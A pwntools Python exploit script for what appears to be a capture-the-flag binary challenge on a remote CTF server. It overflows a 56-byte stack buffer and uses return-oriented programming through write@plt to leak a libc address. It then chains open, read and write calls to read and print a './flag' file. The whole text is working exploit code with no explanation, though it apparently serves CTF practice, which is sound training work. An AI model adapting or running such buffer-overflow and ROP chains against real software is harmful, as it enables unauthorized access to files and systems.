from pwn import*
# p=process('./pwn')
p=remote('ctf.npusec.org.cn',10194)
context(arch='amd64',os='linux',log_level='debug')
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
write_got=elf.got['write']
write_plt=elf.plt['write']
pop_rdi=0x4013ac
pop_rsi=0x4013ae
pop_rdx=0x4013b0
ret=0x40101a
main_addr=0x4013B5
payload=b'a'*56+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+p64(pop_rdx)+p64(8)+p64(write_plt)+p64(main_addr)
p.recvuntil('I heard that you\'ve already learned it, why not give it a try?\n')
# gdb.attach(p)
# pause()
p.sendline(payload)
p.recvuntil(b'It depends on how you allocate the three parameters.\n')
leak=u64(p.recv(8))
libc_base=leak-libc.sym['write']
print ('libc_base:'+hex(libc_base))
open_addr=libc_base+libc.sym['open']
read_addr=libc_base+libc.sym['read']
write_addr=libc_base+libc.sym['write']
bss_addr=0x404060+0xa00
addr=0x404060+0x100

payload1=b'a'*56+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_addr)+p64(pop_rdx)+p64(8)+p64(read_addr)+p64(main_addr)
p.recvuntil(b'I heard that you\'ve already learned it, why not give it a try?\n')
p.sendline(payload1)
p.recvuntil(b'It depends on how you allocate the three parameters.\n')
p.send(b'./flag'.ljust(8,b'\x00'))

payload=b'a'*56+p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(open_addr)
payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(addr)+p64(pop_rdx)+p64(0x100)+p64(read_addr)+p64(main_addr)
p.recvuntil(b'I heard that you\'ve already learned it, why not give it a try?\n')
p.sendline(payload)



payload4=b'a'*56+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(addr)+p64(pop_rdx)+p64(0x100)+p64(write_addr)
print(len(payload4))
pause()
p.recvuntil(b'I heard that you\'ve already learned it, why not give it a try?\n')
p.sendline(payload4)
print(p.recv(timeout=3))
p.interactive()
